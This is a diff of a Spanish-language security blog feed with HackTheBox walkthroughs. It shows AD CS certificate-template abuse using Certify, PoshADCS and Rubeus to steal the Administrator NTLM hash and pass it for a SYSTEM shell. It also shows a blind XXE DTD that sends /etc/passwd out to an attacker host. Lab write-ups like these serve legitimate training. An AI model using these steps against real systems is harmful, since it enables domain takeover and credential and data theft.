+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Listing info about the Enterprise CA <span class="s1">'windcorp-CA'</span>
+
+    Enterprise CA Name            : windcorp-CA
+    DNS Hostname                  : earth.windcorp.htb
+    FullName                      : earth.windcorp.htb<span class="se">\w</span>indcorp-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : <span class="nv">CN</span><span class="o">=</span>windcorp-CA, <span class="nv">DC</span><span class="o">=</span>windcorp, <span class="nv">DC</span><span class="o">=</span>htb
+    Cert Thumbprint               : 3C0BAA04CCB852BB7703BB662CEF4A1FB9B54A39
+    Cert Serial                   : 7DF2D3B3A1A4B8B5484E459E1D5CA15D
+    Cert Start Date               : 5/24/2021 7:48:07 PM
+    Cert End Date                 : 1/5/2124 6:40:41 PM
+    Cert Chain                    : <span class="nv">CN</span><span class="o">=</span>windcorp-CA,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY<span class="se">\A</span>uthenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
+      Allow  ManageCA, ManageCertificates               WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
+    Enrollment Agent Restrictions : None
+
+<span class="o">[</span>+] No Vulnerable Certificates Templates found!
+
+    CA Name                               : earth.windcorp.htb<span class="se">\w</span>indcorp-CA
+    Template Name                         : Web
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Server Authentication
+    mspki-certificate-application-policy  : Server Authentication
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
+                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
+        All Extended Rights         : WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+      Object Control Permissions
+        Owner                       : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
+        Full Control Principals     : WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+        WriteOwner Principals       : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
+                                      WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
+                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
+                                      WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+        WriteDacl Principals        : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
+                                      WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
+                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
+                                      WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+        WriteProperty Principals    : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
+                                      WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
+                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
+                                      WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+
+
+
+Certify completed <span class="k">in </span>00:00:12.5821066
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a explotar el Template <code class="language-plaintext highlighter-rouge">Web</code> tiene el grupo <code class="language-plaintext highlighter-rouge">WINDCORP\webdevelopers</code> asignado como <code class="language-plaintext highlighter-rouge">Owner</code> y nuestro usuario pertenece a ese grupo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; net user diegocruz
+User name                    DiegoCruz
+Full Name
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/26/2021 6:42:38 PM
+Password expires             Never
+Password changeable          5/27/2021 6:42:38 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   7/14/2024 8:51:41 PM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *webdevelopers
+The command completed successfully.
+</span></code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos a usar el siguiente script en powershell para explotarlo <a href="https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1">https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1</a>.</p>
+  </li>
+  <li>
+    <p>El problema de esta máquina es sus UPN (User Principal Name) están mal estos se usan para identificar a un usuario en un dominio casi siempre es <code class="language-plaintext highlighter-rouge">nombre@dominio</code> nuestro usuario tiene <code class="language-plaintext highlighter-rouge">.thm</code> esto puedo causar problemas y en el .ps1 es donde se esta usando.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$TargetUPN</span> <span class="o">=</span> <span class="nv">$user</span>.userprincipalname
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span> <span class="o">=</span> Get-ADUser <span class="nt">-Identity</span> DiegoCruz <span class="nt">-Properties</span> UserPrincipalName
+PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span>.UserPrincipalName
+Diego.Cruz@windcorp.thm
+</code></pre></div></div>
+
+<ul>
+  <li>Lo que vamos hacer es cambiar la línea de código para que se identifique con el <code class="language-plaintext highlighter-rouge">samaccountname</code> que no tiene .thm para no obtener errores.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span> <span class="o">=</span> Get-ADUser <span class="nt">-Identity</span> DiegoCruz <span class="nt">-Properties</span> SamAccountName
+PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span>.SamAccountName
+DiegoCruz
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>ADCS.ps1 | <span class="nb">grep </span>samaccountname
+    <span class="nv">$TargetUPN</span> <span class="o">=</span> <span class="nv">$user</span>.samaccountname
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a moverlo a la máquina.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; curl http://10.10.14.74/ADCS.ps1 <span class="nt">-o</span> ADCS.ps1
+</code></pre></div></div>
+
+<ul>
+  <li>También vamos a necesitar <code class="language-plaintext highlighter-rouge">PowerView</code> <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; curl http://10.10.14.74/PowerView.ps1 <span class="nt">-o</span> PowerView.ps1
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora importarnos los módulos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; Import-Module .<span class="se">\P</span>owerView.ps1
+PS C:<span class="se">\P</span>rogramData&gt; Import-Module .<span class="se">\A</span>DCS.ps1
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos por el certificado pasándole el nombre del template y el usuario que queremos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; Get-SmartCardCertificate <span class="nt">-Identity</span> Administrator <span class="nt">-TemplateName</span> Web <span class="nt">-NoSmartCard</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora tenemos el certificado.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; <span class="nb">dir </span>Cert:<span class="se">\C</span>urrentUser<span class="se">\M</span>y
+
+
+   PSParentPath: Microsoft.PowerShell.Security<span class="se">\C</span>ertificate::CurrentUser<span class="se">\M</span>y
+
+Thumbprint                                Subject
+<span class="nt">----------</span>                                <span class="nt">-------</span>
+F1D2CE4A7727B4A4ED1414302EE5E887063838FB
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora usamos Rubeus para obtener el hash<a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; .<span class="se">\R</span>ubeus.exe asktgt /user:Administrator /certificate:F1D2CE4A7727B4A4ED1414302EE5E887063838FB /getcredentials
+
+   ______        _
+  <span class="o">(</span>_____ <span class="se">\ </span>     | |
+   _____<span class="o">)</span> <span class="o">)</span>_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ <span class="se">\|</span> ___ | | | |/___<span class="o">)</span>
+  | |  <span class="se">\ \|</span> |_| | |_<span class="o">)</span> <span class="o">)</span> ____| |_| |___ |
+  |_|   |_|____/|____/|_____<span class="o">)</span>____/<span class="o">(</span>___/
+
+  v2.2.0
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Ask TGT
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using PKINIT with etype rc4_hmac and subject:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building AS-REQ <span class="o">(</span>w/ PKINIT preauth<span class="o">)</span> <span class="k">for</span>: <span class="s1">'windcorp.htb\Administrator'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using domain controller: fe80::95fd:7c69:ca2c:4d61%10:88
+<span class="o">[</span>+] TGT request successful!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">base64</span><span class="o">(</span>ticket.kirbi<span class="o">)</span>:
+
+      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
+      <span class="nv">MTc0NFqoDhsMV0lORENPUlAuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0Gwx3aW5kY29ycC5odGI</span><span class="o">=</span>
+
+  ServiceName              :  krbtgt/windcorp.htb
+  ServiceRealm             :  WINDCORP.HTB
+  UserName                 :  Administrator
+  UserRealm                :  WINDCORP.HTB
+  StartTime                :  7/14/2024 11:17:44 PM
+  EndTime                  :  7/15/2024 9:17:44 AM
+  RenewTill                :  7/21/2024 11:17:44 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64<span class="o">(</span>key<span class="o">)</span>              :  <span class="nv">ilnUan6u3cm7e372x044og</span><span class="o">==</span>
+  ASREP <span class="o">(</span>key<span class="o">)</span>              :  2778BBEAF9B6991B0EFAD85F81EBA582
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : 3CCC18280610C6CA3156F995B5899E09
+PS C:<span class="se">\P</span>rogramData&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que es correcto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 3CCC18280610C6CA3156F995B5899E09
+SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] windcorp.htb<span class="se">\A</span>dministrator:3CCC18280610C6CA3156F995B5899E09 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ya podemos conectarnos y ver la root flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-psexec windcorp.htb/Administrator@earth.windcorp.htb <span class="nt">-hashes</span> :3CCC18280610C6CA3156F995B5899E09
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on earth.windcorp.htb.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file aLLnjNcY.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on earth.windcorp.htb.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service Efnp on earth.windcorp.htb.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service Efnp.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.2114]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+8a4cae54d70626a3512d970aeecd52b6
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Authority (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html" rel="alternate" type="text/html" title="HackTheBox - Authority (medium)" /><published>2024-07-10T00:00:00-06:00</published><updated>2024-07-10T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/10/authority.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/e6257bbacb2ddd56f5703bb61eadd8cb.png" />
 </p>
 
@@ -8664,1292 +9947,4 @@ root
 <span class="c"># bash</span>
 root@pandora:/tmp# <span class="nb">cat</span> /root/root.txt
 774d751ca4a7eabaed28a386f20a26c2
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Fulcrum (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum.html" rel="alternate" type="text/html" title="HackTheBox - Fulcrum (insane)" /><published>2024-06-15T00:00:00-06:00</published><updated>2024-06-15T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/06/15/fulcrum.html"><![CDATA[<p align="center">
-<img src="https://labs.hackthebox.com/storage/avatars/31252a37873dc31f600f40de91dd52d6.png" />
-</p>
-
-<ul>
-  <li>Fulcrum is one of the most challenging machines on Hack The Box. It requires multiple pivots between Linux and Windows, and focuses heavily on the use of PowerShell.</li>
-</ul>
-
-<h2 id="portscan">PortScan</h2>
-
-<ul>
-  <li>Comenzamos escaneando los puertos abiertos y servicios de la máquina victima.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p4</span>,22,80,88,9999,56423 10.10.10.62 <span class="nt">-oN</span> targeted
-Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-14 12:29 CST
-Nmap scan report <span class="k">for </span>10.10.10.62
-Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
-
-PORT      STATE SERVICE VERSION
-4/tcp     open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
-|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
-|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
-|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
-80/tcp    open  http    nginx 1.18.0 (Ubuntu)
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-| http-methods:
-|_  Potentially risky methods: TRACE
-|_http-title: Input string was not in a correct format.
-88/tcp    open  http    nginx 1.18.0 (Ubuntu)
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-|_http-title: phpMyAdmin
-| http-robots.txt: 1 disallowed entry
-|_/
-9999/tcp  open  http    nginx 1.18.0 (Ubuntu)
-|_http-title: Input string was not in a correct format.
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-| http-methods:
-|_  Potentially risky methods: TRACE
-56423/tcp open  http    nginx 1.18.0 (Ubuntu)
-|_http-server-header: Fulcrum-API Beta
-|_http-title: Site doesn'</span>t have a title <span class="o">(</span>application/json<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</code></pre></div></div>
-
-<h2 id="enumeración">Enumeración</h2>
-
-<ul>
-  <li>
-    <p>Tenemos puertos abiertos que corren el servicio <code class="language-plaintext highlighter-rouge">http</code> y uno <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
-  </li>
-  <li>
-    <p>Vamos a ver lo que hay en cada servicio.</p>
-  </li>
-  <li>
-    <p>En el puerto <strong>80</strong> vemos lo siguiente.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/1.png" />
-</p>
-
-<ul>
-  <li>En el puerto <strong>88</strong> vemos el panel típico de <code class="language-plaintext highlighter-rouge">phpMyAdmin</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/2.png" />
-</p>
-
-<ul>
-  <li>El puerto <strong>9999</strong> vemos lo mismo que en el puerto <strong>80</strong>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/3.png" />
-</p>
-
-<ul>
-  <li>Vemos esto en el puerto <strong>4</strong>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/4.png" />
-</p>
-
-<ul>
-  <li>Si le damos <code class="language-plaintext highlighter-rouge">click</code> en try again vemos que la <code class="language-plaintext highlighter-rouge">url</code> es interesante.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/5.png" />
-</p>
-
-<ul>
-  <li>Hay otro puerto abierto el cual nos muestra data en formato <code class="language-plaintext highlighter-rouge">JSON</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/6.png" />
-</p>
-
-<ul>
-  <li>Algo que podemos hacer es modificar la data con <code class="language-plaintext highlighter-rouge">BurpSuite</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/7.png" />
-</p>
-
-<ul>
-  <li>Si enviamos data vemos que es lo mismo no cambia.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/8.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Algo que podemos hacer es pasarle una estructura en <code class="language-plaintext highlighter-rouge">xml</code>.</p>
-  </li>
-  <li>
-    <p>Vemos que ahora si cambia.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/9.png" />
-</p>
-
-<h2 id="shell-as-www-data">Shell as www-data</h2>
-
-<ul>
-  <li>
-    <p>Vamos a probar un XXE <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity</a>, <a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a>.</p>
-  </li>
-  <li>
-    <p>Declaramos una entidad que se llama <code class="language-plaintext highlighter-rouge">xxe</code> que usa un <code class="language-plaintext highlighter-rouge">wrapper</code> de tipo file que carga el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la máquina.</p>
-  </li>
-  <li>
-    <p>Pero no nos reporta nada.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/10.png" />
-</p>
-
-<ul>
-  <li>Podemos cambiar las etiquetas a las nuestras para ver si cambia algo.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/11.png" />
-</p>
-
-<ul>
-  <li>Puede que sea a ciegas por que no nos reporta nada pero podemos probar si recibimos una petición a un servidor nuestro.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
-Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora vemos que si funciona.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/12.png" />
-</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
-Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:29:25] code 404, message File not found
-10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:29:25] <span class="s2">"GET /test HTTP/1.0"</span> 404 -
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Sabiendo esto podemos probar lo siguiente <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#blind-ssrf-exfiltrate-data-out-of-band">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#blind-ssrf-exfiltrate-data-out-of-band</a>.</p>
-  </li>
-  <li>
-    <p>Necesitamos parámetros en este caso vamos a crear <code class="language-plaintext highlighter-rouge">%param1</code>.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/13.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Vamos a crear el <code class="language-plaintext highlighter-rouge">xml</code> <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#malicious-dtd-example">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#malicious-dtd-example</a>.</p>
-  </li>
-  <li>
-    <p>Vamos a cargar en <code class="language-plaintext highlighter-rouge">base64</code> el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la maquina.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>zi.xml
-&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/etc/passwd"</span><span class="o">&gt;</span>
-&lt;<span class="o">!</span>ENTITY % param1 <span class="s2">"&lt;!ENTITY filename SYSTEM 'http://10.10.14.62/%file;'&gt;"</span><span class="o">&gt;</span>
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
-Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-</code></pre></div></div>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/insane/fulcrum/14.png" />
-</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3 <span class="nt">-m</span> http.server 80
-Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:45:07] <span class="s2">"GET /zi.xml HTTP/1.0"</span> 200 -
-10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:45:07] code 404, message File not found
